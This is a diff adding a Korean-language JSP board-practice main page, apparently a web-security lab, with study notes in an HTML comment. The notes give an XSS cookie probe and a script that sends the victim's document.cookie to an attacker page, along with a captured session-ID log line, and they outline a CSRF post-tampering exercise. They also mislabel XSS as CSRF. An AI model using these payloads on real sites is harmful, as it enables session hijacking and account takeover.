@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+
+<title>게시판 연습 메인화면</title>
+</head>
+<body>
+	<h1>게시판 연습의 메인 화면입니다.</h1>
+	<button type="button" onclick="location.href='login_main.jsp'"><h3>로그인</h3></button>
+</body>
+</html>
+
+<!-- 
+	1. cookie 변조가 가능한 사이트인지 확인
+	자바스크립트를 통해 document.cookie 속성을 확인
+	공격 문구 : 게시글에 script 태그 구성
+	-> <script>alert(document.cookie)</script>
+	결과로 cookie 에 JSESSIONID 값이 출력되면 CSRF 취약점이 있는 페이지에 해당
+	-> JSESSIONID=694583202600EC09F67180A5C13AAE85
+	
+	2. 세션 ID 탈취
+	로그인한 사용자가 세션 ID 포함해서 정보를 현재 서버가 아닌 공격자 서버로 정보를 보내도록 피싱을 진행
+	- 공격자 서버 구성 (cookie 값을 log 로 기록하기 위해 log 설정 변경
+	- 아래 스크립트 코드는 게시글을 읽은 피해자 시스템 브라우저가 실행
+	- 로그인된 사용자이므로 cookie 값이 있고 cookie 값을 
+	-> <script>document.location='http://localhost:8080/Hacker/attack.jsp?' + document.cookie;</script>
+	
+	-> 9월 07, 2026 2:18:34 오후 org.apache.catalina.core.ApplicationContext log
+		INFO: B104B6E75BFAD2D24085B5664E6AAFD4
+		
+	3. CSRF 공격
+	탈취한 정보를 다른 곳에 활용하거나 공격을 통해 사용자 데이터를 수정(변조)하는 공격
+	- 공격자의 피싱 게시글을 통해 사용자가 작성한 게시글의 내용을 변조하는 실습
+	- 공격자는 변조를 진행하려면 수정시 필요한 페이로드(파라미터)를 확인해야함
+	- 수정모드를 요청하면서 페이로드를 확인
+ -->
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
